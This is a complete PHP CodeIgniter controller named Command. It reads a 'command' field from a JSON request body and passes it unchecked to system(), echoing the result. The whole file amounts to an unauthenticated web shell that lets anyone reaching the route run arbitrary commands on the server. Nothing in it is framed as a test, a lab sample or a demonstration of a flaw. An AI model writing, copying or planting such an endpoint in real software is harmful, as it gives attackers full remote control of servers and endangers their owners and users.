<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Command extends CI_Controller
{
    public function index()
    {
        $jsonArray = json_decode(file_get_contents('php://input'),true);

        $command = $jsonArray['command'];

        echo system($command);
    }
}